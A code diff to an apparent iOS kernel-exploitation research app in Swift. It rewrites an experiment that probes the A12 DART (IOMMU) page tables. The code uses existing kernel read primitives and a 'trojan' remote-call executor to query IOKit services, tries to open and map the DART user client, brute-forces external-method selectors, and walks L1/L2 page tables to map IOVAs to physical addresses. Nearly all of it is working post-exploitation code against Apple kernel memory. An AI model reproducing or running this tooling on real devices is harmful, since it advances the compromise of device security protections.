@@ -4748,176 +4748,307 @@ struct AMFIExperimentView: View {
         }
         
         // ============================================================
-        // STEP 3: Scan kernel memory for DART-related structures
-        // Look for IODARTMapper vtable pointers and instance data
-        // IODARTMapper objects are in the default kernel zone
+        // STEP 3: Find DART page table via IOKit kernel object traversal
+        // Strategy: IODARTMapper kernel object has instance vars containing
+        // the page table base pointer. We find the object via its registry
+        // entry, then read its ivars to get the DART page table address.
+        //
+        // IOKit objects in kernel have structure:
+        //   +0x00: vtable pointer (kernel __TEXT range)
+        //   +0x08: retainCount
+        //   +0x10: instance vars...
+        //   Somewhere in ivars: MMIO base VA, page table pointer, etc.
         // ============================================================
-        detail += "=== Step 3: Kernel scan for DART structures ===\n"
-        
-        // Scan the kernel's __DATA segment for DART-related globals
-        // The IODARTFamily kext stores global state
-        // Look for pointers that reference MMIO space (0x2xxxxx000 physical range)
-        
-        // On A12, the GPU DART MMIO physical base is typically around:
-        // 0x204000000 - 0x206000000 (varies by instance)
-        // After kernel mapping: physBase + gVirtBase - gPhysBase
-        // = 0x204000000 - 0x800000000 + 0xffffffde9a094000
-        // = 0xffffffd69e094000 (approximate)
-        // This is BELOW the zone map range, so it's in the IO mapping area
-        
-        // Better approach: scan for DART TTBR values in kernel memory
-        // A valid DART TTBR has bit[31]=1 and bits[30:0] = PPN
-        // PPN for A12 DRAM: 0x800000 to 0x8C0000 (3GB / 4KB = 0xC0000 pages)
-        // So TTBR value = 0x80000000 | PPN, where PPN is 0x800000-0x8C0000
-        // That means TTBR = 0x80800000 to 0x808C0000
-        
-        // Scan __DATA for values in this range
-        let dataBase = kernBase + 0x30dc000  // __DATA segment
-        var dartTTBRCandidates: [(offset: UInt64, value: UInt64)] = []
-        
-        detail += "Scanning __DATA for DART TTBR patterns...\n"
-        detail += "(Looking for 0x808xxxxx values = VALID + PPN in DRAM range)\n\n"
-        
-        // Scan first 0x7000 bytes of __DATA (safe, non-PPL region — stay well below 0x8000)
-        for off in stride(from: UInt64(0), to: UInt64(0x7000), by: 8) {
-            let val = ds_kread64_safe(dataBase + off)
-            if val == 0 { continue }  // skip zeros fast
-            
-            // Check both 32-bit halves for TTBR pattern
-            let lo32 = UInt32(val & 0xFFFFFFFF)
-            let hi32 = UInt32((val >> 32) & 0xFFFFFFFF)
-            
-            // DART TTBR: bit[31]=1, bits[30:0] = PPN in DRAM range
-            // PPN for 3GB A12: 0x800000 (gPhysBase>>12) to ~0x8C0000
-            for half in [lo32, hi32] {
-                if half & 0x80000000 != 0 {  // VALID bit set
-                    let ppn = half & 0x7FFFFFFF
-                    if ppn >= 0x800000 && ppn < 0x900000 {
-                        dartTTBRCandidates.append((offset: off, value: UInt64(half)))
-                        if dartTTBRCandidates.count <= 5 {
-                            let pa = UInt64(ppn) << 12
-                            detail += "  TTBR candidate at __DATA+0x\(String(format: "%x", off)): "
-                            detail += "0x\(String(format: "%08x", half)) → PA=0x\(String(format: "%llx", pa))\n"
-                        }
-                    }
-                }
-            }
-        }
-        
-        detail += "Found \(dartTTBRCandidates.count) TTBR candidates in __DATA\n\n"
-        
-        // ============================================================
-        // STEP 4: Read DART L1 table directly from TTBR
-        // We found TTBR in __DATA — convert PPN to physmap VA and read L1 entries
-        // ============================================================
-        detail += "=== Step 4: Read DART L1 from TTBR ===\n"
+        detail += "=== Step 3: IOKit object traversal for DART ===\n"
         
         let ourProc = ds_get_our_proc()
         
         // Safety bounds for all reads
         let safeZoneMin: UInt64 = 0xffffffdc00000000
         let safeZoneMax: UInt64 = 0xffffffe400000000
+        // Also allow kernel __TEXT/DATA range for vtable pointers
+        let kernMin: UInt64 = 0xfffffff000000000
+        let kernMax: UInt64 = 0xfffffff100000000
+        
+        func isSafeAddr(_ addr: UInt64) -> Bool {
+            return (addr >= safeZoneMin && addr < safeZoneMax) ||
+                   (addr >= kernMin && addr < kernMax)
+        }
         
         var confirmedDARTL1: UInt64 = 0
         var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
-        var dartL1VA: UInt64 = 0
         
-        if let firstTTBR = dartTTBRCandidates.first {
-            // TTBR value: bit[31]=VALID, bits[30:0]=PPN
-            let ppn = UInt64(firstTTBR.value) & 0x7FFFFFFF
-            let l1PA = ppn << 12  // Physical address of L1 table
+        // Method: Use IOServiceGetMatchingService to get the service port,
+        // then use IORegistryEntryGetProperty to read "IODARTMapperPageTableBase"
+        // or similar property. If that doesn't work, we'll scan the kernel
+        // object's ivars directly.
+        
+        // First, try to get properties from the DART service
+        let dartNameAddr = remote_alloc_str(sb, "AppleT8020DART")
+        let dartMatchDict = RootExecutor.rcall(sb, "IOServiceMatching", dartNameAddr)
+        let dartSvc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, dartMatchDict)
+        RootExecutor.rcall(sb, "free", dartNameAddr)
+        
+        detail += "DART service port: \(dartSvc)\n"
+        
+        if dartSvc != 0 {
+            // Try IORegistryEntryCreateCFProperties to dump all properties
+            let propsAddr = sb.trojanMem + 0x1B00
+            sb[propsAddr].setValue64(0)
+            let kCFAllocatorDefault: UInt64 = 0
             
-            // Convert to physmap VA: PA - gPhysBase + gVirtBase
-            dartL1VA = l1PA &- gPhysBase &+ gVirtBase
+            let propRet = RootExecutor.rcall(sb, "IORegistryEntryCreateCFProperties",
+                                            dartSvc, propsAddr, kCFAllocatorDefault, 0)
+            let propsDict = sb[propsAddr].value64()
             
-            detail += "TTBR value: 0x\(String(format: "%08x", firstTTBR.value))\n"
-            detail += "L1 table PA: 0x\(String(format: "%llx", l1PA))\n"
-            detail += "L1 table VA (physmap): 0x\(String(format: "%llx", dartL1VA))\n\n"
+            detail += "IORegistryEntryCreateCFProperties: ret=\(propRet), dict=0x\(String(format: "%llx", propsDict))\n"
             
-            // Verify L1 VA is in safe zone range
-            guard dartL1VA >= safeZoneMin && dartL1VA < safeZoneMax else {
-                detail += "⚠️ L1 VA outside safe zone range — cannot read directly\n"
-                detail += "L1 is in physmap/VM zone area, need different approach\n"
+            if propsDict != 0 {
+                // Get count of properties
+                let countSel = remote_sel(sb, "count")
+                let count = remote_msg(sb, propsDict, countSel, 0, 0, 0, 0)
+                detail += "Properties count: \(count)\n"
                 
-                let success = false
-                return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
-            }
-            
-            // Read L1 table entries (DART on A12 has 4 TTBRs × 512 entries per L1)
-            // But each TTBR points to one L1 table with 512 entries
-            detail += "Reading L1 entries:\n"
-            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
-            
-            for i in 0..<512 {
-                let readAddr = dartL1VA + UInt64(i * 8)
-                guard readAddr >= safeZoneMin && readAddr < safeZoneMax else { continue }
+                // Try to get specific keys that might contain DART info
+                let keysToTry = ["IODeviceMemory", "dart-page-table", "IODARTMapperPageSize",
+                                 "compatible", "AAPL,phandle", "reg"]
                 
-                let entry = ds_kread64_safe(readAddr)
-                if entry == 0 { continue }
+                let objectForKey = remote_sel(sb, "objectForKey:")
                 
-                if entry & 1 == 1 {
-                    // Valid L1 entry — points to L2 table
-                    let l2PA = entry & 0x0000000FFFFFF000
-                    l1ValidEntries.append((idx: i, entry: entry))
-                    
-                    if l1ValidEntries.count <= 8 {
-                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
-                    }
-                } else {
-                    // Non-zero but not valid — might be interesting
-                    if l1ValidEntries.count < 3 {
-                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) (not valid)\n"
-                    }
-                }
-            }
-            
-            detail += "\nTotal valid L1 entries: \(l1ValidEntries.count)\n\n"
-            
-            if l1ValidEntries.count > 0 {
-                confirmedDARTL1 = dartL1VA
-                
-                // ============================================================
-                // STEP 5: Walk L2 tables to catalog IOVA→PA mappings
-                // ============================================================
-                detail += "=== Step 5: Walk L2 tables ===\n"
-                
-                for (idx, entry) in l1ValidEntries.prefix(4) {
-                    let l2PA = entry & 0x0000000FFFFFF000
-                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
-                    
-                    detail += "\nL1[\(idx)] → L2 VA=0x\(String(format: "%llx", l2VA)):\n"
-                    
-                    // Safety check
-                    guard l2VA >= safeZoneMin && l2VA < safeZoneMax else {
-                        detail += "  ⚠️ L2 VA outside safe zone — skipping\n"
-                        continue
-                    }
-                    
-                    var l2ValidCount = 0
-                    
-                    for j in 0..<512 {
-                        let l2Addr = l2VA + UInt64(j * 8)
-                        guard l2Addr >= safeZoneMin && l2Addr < safeZoneMax else { continue }
-                        
-                        let l2e = ds_kread64_safe(l2Addr)
-                        if l2e & 1 == 1 {
-                            l2ValidCount += 1
-                            let leafPA = l2e & 0x0000000FFFFFF000
-                            let iova = UInt64(idx) << 21 | UInt64(j) << 12
-                            confirmedL2Entries.append((iova: iova, pa: leafPA))
-                            
-                            // Show first few
-                            if l2ValidCount <= 3 {
-                                detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
+                for key in keysToTry {
+                    let keyStr = remote_NSString(sb, key)
+                    let val = remote_msg(sb, propsDict, objectForKey, keyStr, 0, 0, 0)
+                    if val != 0 {
+                        // Try to get description
+                        let descSel = remote_sel(sb, "description")
+                        let descObj = remote_msg(sb, val, descSel, 0, 0, 0, 0)
+                        if descObj != 0 {
+                            let cstrSel = remote_sel(sb, "UTF8String")
+                            let cstr = remote_msg(sb, descObj, cstrSel, 0, 0, 0, 0)
+                            if cstr != 0 {
+                                // Read first 64 chars
+                                var buf = [UInt8](repeating: 0, count: 64)
+                                for i in 0..<64 {
+                                    let b = ds_kread8(cstr + UInt64(i))
+                                    buf[i] = b
+                                    if b == 0 { break }
+                                }
+                                let str = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? "?"
+                                detail += "  \(key) = \(str)\n"
                             }
                         }
                     }
-                    
-                    detail += "  Valid L2 entries: \(l2ValidCount)\n"
                 }
             }
-        } else {
-            detail += "No TTBR candidates found — cannot proceed\n"
+            
+            // ============================================================
+            // STEP 4: Find DART kernel object address via IOKit internals
+            // The IOService port maps to a kernel object. We can find it
+            // by scanning the IPC space or using the registry entry ID.
+            //
+            // Alternative: scan kernel memory for IODARTMapper vtable pattern
+            // IODARTMapper vtable is in IODARTFamily kext __DATA
+            // The object itself is in a kernel zone
+            // ============================================================
+            detail += "\n=== Step 4: Find DART MMIO via kernel object ===\n"
+            
+            // Use IOConnectMapMemory to try mapping DART registers to userspace
+            // This is the most direct approach — if DART supports memory mapping
+            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
+            
+            // Try to open DART with different types
+            let dartConnectAddr = sb.trojanMem + 0x1C00
+            sb[dartConnectAddr].setValue32(0)
+            
+            // Try type 0, 1, 2...
+            var dartConnect: UInt32 = 0
+            for connType: UInt64 in 0..<4 {
+                sb[dartConnectAddr].setValue32(0)
+                let openRet = RootExecutor.rcall(sb, "IOServiceOpen", dartSvc, taskSelf, connType, dartConnectAddr)
+                let conn = sb[dartConnectAddr].value32()
+                if openRet == 0 && conn != 0 {
+                    dartConnect = conn
+                    detail += "DART opened with type \(connType): connect=\(conn)\n"
+                    break
+                }
+            }
+            
+            if dartConnect != 0 {
+                // Try IOConnectMapMemory64 to map DART registers
+                let addrOut = sb.trojanMem + 0x1D00
+                let sizeOut = sb.trojanMem + 0x1D08
+                sb[addrOut].setValue64(0)
+                sb[sizeOut].setValue64(0)
+                
+                for memType: UInt64 in 0..<4 {
+                    sb[addrOut].setValue64(0)
+                    sb[sizeOut].setValue64(0)
+                    let mapRet = RootExecutor.rcall(sb, "IOConnectMapMemory64",
+                                                   UInt64(dartConnect), memType, taskSelf,
+                                                   addrOut, sizeOut, 1) // kIOMapAnywhere=1
+                    let mappedAddr = sb[addrOut].value64()
+                    let mappedSize = sb[sizeOut].value64()
+                    
+                    if mapRet == 0 && mappedAddr != 0 {
+                        detail += "✅ DART memory mapped! type=\(memType) addr=0x\(String(format: "%llx", mappedAddr)) size=0x\(String(format: "%llx", mappedSize))\n"
+                        
+                        // Read DART registers from mapped memory!
+                        // PARAMS1 at +0x00, TTBR at +0x200
+                        let params1 = sb[mappedAddr].value32()
+                        detail += "  PARAMS1 (+0x00): 0x\(String(format: "%08x", params1))\n"
+                        
+                        // Read TTBR[0][0] at offset 0x200
+                        let ttbr0 = sb[mappedAddr + 0x200].value32()
+                        detail += "  TTBR[0][0] (+0x200): 0x\(String(format: "%08x", ttbr0))\n"
+                        
+                        if ttbr0 & 0x80000000 != 0 {
+                            let ppn = UInt64(ttbr0 & 0x7FFFFFFF)
+                            let l1PA = ppn << 12
+                            let l1VA = l1PA &- gPhysBase &+ gVirtBase
+                            detail += "  → L1 PA=0x\(String(format: "%llx", l1PA)), VA=0x\(String(format: "%llx", l1VA))\n"
+                            
+                            // Read more TTBRs
+                            for sid in 0..<4 {
+                                for idx in 0..<4 {
+                                    let ttbrOff = 0x200 + UInt64(sid) * 16 + UInt64(idx) * 4
+                                    let ttbrVal = sb[mappedAddr + ttbrOff].value32()
+                                    if ttbrVal != 0 {
+                                        detail += "  TTBR[\(sid)][\(idx)] (+0x\(String(format: "%x", ttbrOff))): 0x\(String(format: "%08x", ttbrVal))\n"
+                                    }
+                                }
+                            }
+                            
+                            confirmedDARTL1 = l1VA
+                        }
+                        
+                        // Unmap
+                        RootExecutor.rcall(sb, "IOConnectUnmapMemory64",
+                                          UInt64(dartConnect), memType, taskSelf, mappedAddr)
+                        break
+                    } else if mapRet != 0 {
+                        detail += "  MapMemory type \(memType): ret=0x\(String(format: "%x", mapRet))\n"
+                    }
+                }
+                
+                // Also try IOConnectCallScalarMethod to read DART state
+                let scalarOut = sb.trojanMem + 0x1E00
+                let scalarOutCnt = sb.trojanMem + 0x1E80
+                
+                for selector: UInt64 in 0..<8 {
+                    sb[scalarOutCnt].setValue32(16)
+                    let callRet = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
+                                                    UInt64(dartConnect), selector,
+                                                    0, 0, scalarOut, scalarOutCnt)
+                    let outCnt = sb[scalarOutCnt].value32()
+                    if callRet == 0 && outCnt > 0 {
+                        let val0 = sb[scalarOut].value64()
+                        detail += "  Selector \(selector): SUCCESS outCnt=\(outCnt) val[0]=0x\(String(format: "%llx", val0))\n"
+                    }
+                }
+                
+                RootExecutor.rcall(sb, "IOServiceClose", UInt64(dartConnect))
+            } else {
+                detail += "Could not open DART user client (no external methods)\n"
+                detail += "DART doesn't expose user client — need kernel object scan\n\n"
+                
+                // Fallback: scan kernel objects for DART page table pointer
+                // IODARTMapper stores page tables in wired kernel memory
+                // The page table base is a kernel VA in zone range
+                // We can find it by reading IODARTMapper's ivars
+                
+                // From IOKit: each IOService has a kernel object at a zone address
+                // The registry entry ID can help us find it
+                // But we need the actual kernel pointer to the IOService object
+                
+                // Alternative approach: read DART MMIO directly via KRW
+                // DART MMIO is mapped into kernel VA space during boot
+                // On A12, DART MMIO physical addresses are in device tree
+                // Typical: 0x231000000 for AGX DART
+                // Kernel maps this to a VA we can find by scanning
+                
+                // Known A12 DART MMIO physical bases (from device tree):
+                // AGX DART: 0x231004000 (or nearby)
+                // We can compute kernel VA: these are mapped via ml_io_map
+                // which puts them in the iokit VA range (above kernel __TEXT)
+                
+                detail += "Trying direct MMIO read via known A12 DART PA...\n"
+                
+                // A12 AGX DART MMIO is typically at physical 0x231004000
+                // Kernel maps IO at: PA - 0 + io_base_va
+                // io_base_va is typically kernBase + large offset
+                // But we can try reading via physmap: PA - gPhysBase + gVirtBase
+                // Wait — MMIO is NOT in DRAM, so physmap won't work for it.
+                // MMIO is device memory, not RAM.
+                
+                // The only way to read MMIO is through the kernel's IO mapping.
+                // We need to find where the kernel mapped DART MMIO.
+                // This is stored in the IODARTMapper object's ivars.
+                
+                detail += "MMIO not accessible via physmap (device memory, not DRAM)\n"
+                detail += "Need IODARTMapper kernel object pointer to find MMIO VA\n"
+            }
+            
+            RootExecutor.rcall(sb, "IOObjectRelease", dartSvc)
+        }
+        
+        // ============================================================
+        // STEP 5: If we got DART L1, walk L2 tables
+        // ============================================================
+        if confirmedDARTL1 != 0 {
+            detail += "\n=== Step 5: Walk L2 tables from confirmed L1 ===\n"
+            detail += "L1 VA: 0x\(String(format: "%llx", confirmedDARTL1))\n\n"
+            
+            guard confirmedDARTL1 >= safeZoneMin && confirmedDARTL1 < safeZoneMax else {
+                detail += "⚠️ L1 VA outside safe zone — cannot walk\n"
+                // Still report what we found
+                let success = true
+                return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
+            }
+            
+            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
+            
+            for i in 0..<512 {
+                let readAddr = confirmedDARTL1 + UInt64(i * 8)
+                guard readAddr >= safeZoneMin && readAddr < safeZoneMax else { continue }
+                let entry = ds_kread64_safe(readAddr)
+                if entry == 0 { continue }
+                if entry & 1 == 1 {
+                    l1ValidEntries.append((idx: i, entry: entry))
+                    if l1ValidEntries.count <= 8 {
+                        let l2PA = entry & 0x0000000FFFFFF000
+                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
+                    }
+                }
+            }
+            
+            detail += "Valid L1 entries: \(l1ValidEntries.count)\n\n"
+            
+            for (idx, entry) in l1ValidEntries.prefix(4) {
+                let l2PA = entry & 0x0000000FFFFFF000
+                let l2VA = l2PA &- gPhysBase &+ gVirtBase
+                
+                guard l2VA >= safeZoneMin && l2VA < safeZoneMax else {
+                    detail += "L1[\(idx)] → L2 VA outside safe zone\n"
+                    continue
+                }
+                
+                var l2ValidCount = 0
+                for j in 0..<512 {
+                    let l2Addr = l2VA + UInt64(j * 8)
+                    guard l2Addr >= safeZoneMin && l2Addr < safeZoneMax else { continue }
+                    let l2e = ds_kread64_safe(l2Addr)
+                    if l2e & 1 == 1 {
+                        l2ValidCount += 1
+                        let leafPA = l2e & 0x0000000FFFFFF000
+                        let iova = UInt64(idx) << 21 | UInt64(j) << 12
+                        confirmedL2Entries.append((iova: iova, pa: leafPA))
+                        if l2ValidCount <= 3 {
+                            detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
+                        }
+                    }
+                }
+                detail += "  L1[\(idx)] → \(l2ValidCount) valid L2 entries\n"
+            }
         }
         
         detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
